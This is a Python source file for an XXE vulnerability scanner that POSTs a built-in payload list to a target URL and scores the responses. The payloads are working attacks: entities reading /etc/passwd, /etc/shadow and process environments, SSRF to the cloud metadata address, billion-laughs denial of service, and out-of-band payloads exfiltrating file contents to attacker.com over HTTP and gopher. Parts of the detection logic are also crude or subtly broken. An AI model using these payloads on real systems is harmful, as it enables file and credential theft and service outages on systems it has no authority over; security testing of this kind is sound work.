import requests
import logging
import xml.etree.ElementTree as ET
from typing import List, Dict, Any, Optional, Union, Tuple
from urllib.parse import urlparse
import base64
import threading
import concurrent.futures
import time
import re
import json
import ssl
import socket
import random
from datetime import datetime
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup

# Suppress unverified SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Logging configuration
logging.basicConfig(
    filename="logs/xxe.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class WAFDetector:
    """Web Application Firewall Detector"""
    def __init__(self):
        self.waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'F5 BIG-IP': ['BigIP', 'F5'],
            'Imperva': ['incap_ses', '_incapsula_'],
            'Akamai': ['akamai', 'aka'],
            'AWS WAF': ['x-amzn-requestid', 'awselb'],
            'Barracuda': ['barra_counter_session'],
            'DDoS-Guard': ['__ddg1', '__ddg2'],
            'Sucuri': ['sucuri', '_sw_'],
            'Wordfence': ['wordfence']
        }
    
    def detect(self, response: requests.Response) -> Optional[str]:
        """Detects if a WAF is present based on headers and response content."""
        headers = str(response.headers).lower()
        body = response.text.lower()
        
        for waf, signatures in self.waf_signatures.items():
            if any(sig.lower() in headers or sig.lower() in body for sig in signatures):
                return waf
        return None

class XXEScanner:
    def __init__(self, callback: Optional[callable] = None):
        """
        Initializes the XXE scanner.
        
        Args:
            callback: Optional function to update the UI.
        """
        self.callback = callback
        self.running = False
        self.results = []
        self._lock = threading.Lock()
        self.waf_detector = WAFDetector()
        self.cache = {}
        self.rate_limit = 10  # requests per second
        self.last_request_time = 0
        self.proxy_settings = None
        self.auth = None
        self.verify_ssl = True
        self.timeout = 10
        self.max_retries = 3
        self.collaborator_server = None  # For out-of-band XXE
        self.thorough_mode = False  # Exhaustive scan mode
        
        # Initialize payloads
        self.payloads = self._initialize_payloads()

    def _initialize_payloads(self) -> Dict[str, List[str]]:
        """Initializes categorized payloads."""
        return {
            'file_read': [
                # Linux
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><test>&xxe;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><test>&xxe;</test>''',
                # Windows
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><test>&xxe;</test>'''
            ],
            'ssrf': [
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://internal-server:8080/">]><test>&xxe;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "https://169.254.169.254/latest/meta-data/">]><test>&xxe;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://localhost:22">]><test>&xxe;</test>'''
            ],
            'dos': [
                # Billion Laughs
                '''<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;">]><lolz>&lol4;</lolz>''',
                # Quadratic Blowup
                '''<?xml version="1.0"?><!DOCTYPE kaboom [<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">]><root>&a;&a;&a;&a;&a;</root>''',
                # Remote Resource
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///dev/random">]><test>&xxe;</test>'''
            ],
            'oob': [
                # Out-of-Band Data Exfiltration
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><test>test</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%payload;'>">%param1;%exfil;]><test>test</test>'''
            ],
            'error_based': [
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///nonexistent">%xxe;]><test>test</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://nonexistent/evil.dtd">%dtd;]><test>test</test>'''
            ],
            'parameter_entities': [
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % param1 "file:///etc/passwd"><!ENTITY % param2 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%param1;'>">%param2;]><test>&exfil;</test>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % payload SYSTEM "file:///etc/passwd"><!ENTITY % wrapper "<!ENTITY send SYSTEM 'gopher://attacker.com:1337/?%payload;'>">%wrapper;]><test>&send;</test>'''
            ]
        }

    def configure(self, **kwargs):
        """Configures scanner options."""
        valid_options = {
            'rate_limit', 'proxy_settings', 'auth', 'verify_ssl',
            'timeout', 'max_retries', 'collaborator_server', 'thorough_mode'
        }
        
        for key, value in kwargs.items():
            if key in valid_options:
                setattr(self, key, value)

    def scan_async(self, url: str, scan_types: Optional[List[str]] = None) -> None:
        """
        Performs an asynchronous XXE scan.
        
        Args:
            url: URL to scan.
            scan_types: Optional list of payload types to test.
        """
        def _scan_worker():
            try:
                scan_types_to_use = scan_types or list(self.payloads.keys())
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                    futures = []
                    
                    for scan_type in scan_types_to_use:
                        if scan_type not in self.payloads:
                            continue
                            
                        for payload in self.payloads[scan_type]:
                            futures.append(
                                executor.submit(
                                    self.scan,
                                    url=url,
                                    payload=payload,
                                    scan_type=scan_type
                                )
                            )
                    
                    for future in concurrent.futures.as_completed(futures):
                        try:
                            result = future.result()
                            if result['vulnerable']:
                                self._add_result(result)
                        except Exception as e:
                            logging.error(f"Error in asynchronous scan: {str(e)}")
                            
            except Exception as e:
                logging.error(f"Error in scan worker: {str(e)}")
            finally:
                self.running = False
        
        if not self.running:
            self.running = True
            threading.Thread(target=_scan_worker).start()

    def scan(self, url: str, payload: str, scan_type: str, headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Performs an XXE scan."""
        try:
            self._respect_rate_limit()
            
            cache_key = f"{url}:{payload}"
            if cache_key in self.cache:
                return self.cache[cache_key]
            
            headers = headers or {'Content-Type': 'application/xml'}
            session = self._prepare_session()
            response = self._make_request_with_retry(session, url, payload, headers)
            waf = self.waf_detector.detect(response)
            
            # Full analysis
            vuln_info = self._analyze_response(url, payload, response, waf, scan_type)
            
            # Heuristic analysis
            heuristic_info = self._analyze_heuristic(response, scan_type)
            vuln_info.update(heuristic_info)
            
            # Out-of-band detection
            if self.collaborator_server and scan_type == 'oob':
                oob_info = self._check_oob_vulnerability(url, payload)
                vuln_info.update(oob_info)
            
            self.cache[cache_key] = vuln_info
            self._add_result(vuln_info)
            
            return vuln_info
            
        except Exception as e:
            error_result = {
                'url': url,
                'error': str(e),
                'vulnerable': False,
                'timestamp': self._get_timestamp(),
                'severity': 'error'
            }
            self._add_result(error_result)
            return error_result

    def _analyze_response(self, url: str, payload: str, response: requests.Response, 
                         waf: Optional[str], scan_type: str) -> Dict[str, Any]:
        """Analyzes the response in detail."""
        is_vulnerable = self._check_vulnerability(response, scan_type)
        blind_vulnerable = self._check_blind_vulnerability(response)
        error_based = self._check_error_based(response)
        
        severity = self._calculate_severity(is_vulnerable, blind_vulnerable, error_based)
        
        return {
            'url': url,
            'payload': payload,
            'scan_type': scan_type,
            'response_code': response.status_code,
            'response_headers': dict(response.headers),
            'response_text': response.text[:1000],
            'vulnerable': is_vulnerable['vulnerable'],
            'evidence': is_vulnerable['evidence'],
            'blind_vulnerable': blind_vulnerable,
            'error_based': error_based,
            'waf_detected': waf,
            'severity': severity,
            'timestamp': self._get_timestamp(),
            'recommendations': self._get_recommendations(is_vulnerable['vulnerable'], waf, scan_type)
        }

    def _analyze_heuristic(self, response: requests.Response, scan_type: str) -> Dict[str, Any]:
        """Performs heuristic analysis of the response."""
        result = {
            'score': 0,
            'confidence': 'LOW',
            'indicators': []
        }
        
        # Response time analysis
        response_time = response.elapsed.total_seconds()
        if response_time > 5:
            result['score'] += 30
            result['indicators'].append(f'High response time: {response_time}s')
        
        # Response size analysis
        content_length = len(response.content)
        if content_length > 1000000:  # > 1MB
            result['score'] += 20
            result['indicators'].append(f'Large response size: {content_length} bytes')
        
        # Specific analysis by type
        type_indicators = {
            'file_read': ['root:', '/home/', 'administrator:'],
            'ssrf': ['internal', 'meta-data', 'localhost'],
            'dos': ['response_time > 10'],
            'oob': ['callback', 'interaction'],
            'error_based': ['error', 'exception', 'failed'],
        }
        
        if scan_type in type_indicators:
            for indicator in type_indicators[scan_type]:
                if indicator in response.text.lower():
                    result['score'] += 25
                    result['indicators'].append(f'Found {scan_type} indicator: {indicator}')
        
        # Calculate confidence
        if result['score'] >= 70:
            result['confidence'] = 'HIGH'
        elif result['score'] >= 40:
            result['confidence'] = 'MEDIUM'
        
        return result

    def _check_vulnerability(self, response: requests.Response, scan_type: str) -> Dict[str, Any]:
        """Checks XXE vulnerabilities by type."""
        result = {'vulnerable': False, 'evidence': []}
        
        indicators = {
            'file_read': {
                'unix': [
                    'root:x:', 'bin:x:', 'nobody:x:', 'mail:x:', '/bin/bash',
                    '/etc/', '/var/', '/usr/', '/home/', '/proc/'
                ],
                'windows': [
                    '[boot loader]', '[fonts]', 'windows', 'systemroot',
                    'program files', 'users', 'documents and settings'
                ]
            },
            'ssrf': {
                'aws': ['ami-', 'instance-id', 'security-credentials'],
                'internal': ['internal', 'intranet', 'localhost', '127.0.0.1'],
                'metadata': ['metadata', 'api', 'endpoint']
            },
            'dos': {
                'errors': ['memory', 'timeout', 'capacity', 'overflow'],
                'performance': ['slow', 'delayed', 'response time']
            },
            'oob': {
                'callbacks': ['dns', 'http', 'ftp'],
                'data': ['exfiltration', 'transfer', 'send']
            }
        }
        
        if scan_type in indicators:
            text_to_check = response.text.lower() + str(response.headers).lower()
            
            for category, patterns in indicators[scan_type].items():
                matches = [p for p in patterns if p.lower() in text_to_check]
                if matches:
                    result['vulnerable'] = True
                    result['evidence'].extend(matches)
        
        return result

    def _check_blind_vulnerability(self, response: requests.Response) -> bool:
        """Checks for blind XXE vulnerabilities."""
        response_time = float(response.elapsed.total_seconds())
        
        if response_time > 5:
            return True
            
        indirect_indicators = [
            'java.io.IOException',
            'javax.xml',
            'org.xml.sax',
            'xml reader error',
            'xml parsing error'
        ]
        
        return any(ind in response.text for ind in indirect_indicators)

    def _check_error_based(self, response: requests.Response) -> bool:
        """Checks for error-based XXE vulnerabilities."""
        error_patterns = [
            r'java\.io\.FileNotFoundException',
            r'System\.DirectoryNotFoundException',
            r'Access to the path.*is denied',
            r'fopen\(\).*failed to open stream',
            r'SimpleXMLElement::__construct\(\)',
            r'Warning: simplexml_load_string\(\)'
        ]
        
        return any(re.search(pattern, response.text) for pattern in error_patterns)

    def _calculate_severity(self, is_vulnerable: Dict[str, Any], blind_vulnerable: bool, error_based: bool) -> str:
        """Calculates the CVSS severity."""
        if is_vulnerable['vulnerable'] and len(is_vulnerable['evidence']) > 2:
            return 'CRITICAL'  # CVSS 9.0-10.0
        elif is_vulnerable['vulnerable'] or blind_vulnerable:
            return 'HIGH'      # CVSS 7.0-8.9
        elif error_based:
            return 'MEDIUM'    # CVSS 4.0-6.9
        return 'LOW'          # CVSS 0.1-3.9

    def _get_recommendations(self, is_vulnerable: bool, waf: Optional[str], scan_type: str) -> List[str]:
        """Generates mitigation recommendations."""
        recommendations = []
        
        if is_vulnerable:
            base_recs = [
                'Disable external XML entity processing',
                'Implement a whitelist for allowed entities',
                'Update XML libraries to the latest versions',
                'Validate and sanitize all XML inputs'
            ]
            recommendations.extend(base_recs)
            
            # Type-specific recommendations
            type_recs = {
                'file_read': [
                    'Implement file access controls',
                    'Use relative and sanitized paths'
                ],
                'ssrf': [
                    'Implement a whitelist of allowed URLs',
                    'Properly configure internal firewalls'
                ],
                'dos': [
                    'Set size limits for XML',
                    'Implement rate limiting'
                ],
                'oob': [
                    'Block unauthorized outbound connections',
                    'Monitor suspicious network traffic'
                ]
            }
            
            if scan_type in type_recs:
                recommendations.extend(type_recs[scan_type])
        
        if not waf:
            recommendations.append('Consider implementing a WAF')
        elif waf:
            recommendations.append(f"Review WAF rules ({waf}) to improve protection against XXE")
        
        return recommendations

    def _respect_rate_limit(self):
        """Implements rate limiting."""
        if self.rate_limit > 0:
            current_time = time.time()
            time_passed = current_time - self.last_request_time
            if time_passed < 1.0 / self.rate_limit:
                time.sleep((1.0 / self.rate_limit) - time_passed)
            self.last_request_time = time.time()

    def _prepare_session(self) -> requests.Session:
        """Prepares a requests session."""
        session = requests.Session()
        
        if self.proxy_settings:
            session.proxies.update(self.proxy_settings)
        
        if self.auth:
            if isinstance(self.auth, tuple):
                session.auth = self.auth
            elif isinstance(self.auth, dict):
                session.headers.update(self.auth)
        
        session.verify = self.verify_ssl
        return session

    def _make_request_with_retry(self, session: requests.Session, url: str, 
                                payload: str, headers: Dict[str, str]) -> requests.Response:
        """Makes a request with retries."""
        for attempt in range(self.max_retries):
            try:
                response = session.post(
                    url,
                    data=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                return response
            except RequestException as e:
                if attempt == self.max_retries - 1:
                    raise
                time.sleep(2 ** attempt)

    def _sanitize_payload(self, payload: str) -> str:
        """Sanitizes and validates an XML payload."""
        try:
            ET.fromstring(payload)
            
            payload = payload.replace("'", "&apos;")
            payload = payload.replace('"', "&quot;")
            payload = payload.replace("<", "&lt;")
            payload = payload.replace(">", "&gt;")
            payload = payload.replace("&", "&amp;")
            
            return payload
        except ET.ParseError:
            raise ValueError("Invalid XML payload")

    def _get_timestamp(self) -> str:
        """Returns a formatted timestamp."""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _add_result(self, result: Dict[str, Any]) -> None:
        """Adds a result to the history."""
        with self._lock:
            self.results.append(result)
            if self.callback:
                self.callback(result)

    def generate_report(self, results: List[Dict[str, Any]], format: str = 'json') -> str:
        """Generates a detailed report."""
        report = {
            'summary': {
                'total_scans': len(results),
                'vulnerabilities_found': sum(1 for r in results if r.get('vulnerable')),
                'scan_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'severity_counts': {
                    'CRITICAL': sum(1 for r in results if r.get('severity') == 'CRITICAL'),
                    'HIGH': sum(1 for r in results if r.get('severity') == 'HIGH'),
                    'MEDIUM': sum(1 for r in results if r.get('severity') == 'MEDIUM'),
                    'LOW': sum(1 for r in results if r.get('severity') == 'LOW')
                }
            },
            'vulnerabilities': [
                {
                    'url': r['url'],
                    'type': r.get('scan_type', 'Unknown'),
                    'severity': r.get('severity', 'Unknown'),
                    'evidence': r.get('evidence', []),
                    'recommendations': r.get('recommendations', [])
                }
                for r in results if r.get('vulnerable')
            ],
            'technical_details': results
        }
        
        if format == 'json':
            return json.dumps(report, indent=4)
        elif format == 'html':
            return self._generate_html_report(report)
        
        raise ValueError("Unsupported report format")

    def _generate_html_report(self, report: Dict[str, Any]) -> str:
        """Generates an HTML report."""
        html = f"""
        <html>
        <head>
            <title>XXE Scan Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .critical {{ color: red; }}
                .high {{ color: orange; }}
                .medium {{ color: yellow; }}
                .low {{ color: green; }}
            </style>
        </head>
        <body>
            <h1>XXE Vulnerability Scan Report</h1>
            <h2>Summary</h2>
            <ul>
                <li>Total Scans: {report['summary']['total_scans']}</li>
                <li>Vulnerabilities Found: {report['summary']['vulnerabilities_found']}</li>
                <li>Scan Date: {report['summary']['scan_date']}</li>
            </ul>
            
            <h2>Vulnerabilities</h2>
            {''.join(f'''
            <div class="{v['severity'].lower()}">
                <h3>{v['type']} - {v['severity']}</h3>
                <p>URL: {v['url']}</p>
                <h4>Evidence:</h4>
                <ul>{''.join(f'<li>{e}</li>' for e in v['evidence'])}</ul>
                <h4>Recommendations:</h4>
                <ul>{''.join(f'<li>{r}</li>' for r in v['recommendations'])}</ul>
            </div>
            ''' for v in report['vulnerabilities'])}
        </body>
        </html>
        """
        return html

def validate_xml_endpoint(url: str) -> bool:
    """Validates if an endpoint accepts XML."""
    try:
        xml = '''<?xml version="1.0"?><test>hello</test>'''
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=xml, headers=headers, timeout=5)
        
        return (
            response.status_code != 415 and
            ('xml' in response.headers.get('Content-Type', '').lower() or
             response.status_code == 200)
        )
    except Exception as e:
        logging.error(f"Error validating XML endpoint: {str(e)}")
        return False

def export_results(results: List[Dict[str, Any]], filename: str) -> bool:
    """Exports the results to a file."""
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=4)
        return True
    except Exception as e:
        logging.error(f"Error exporting results: {str(e)}")
        return False
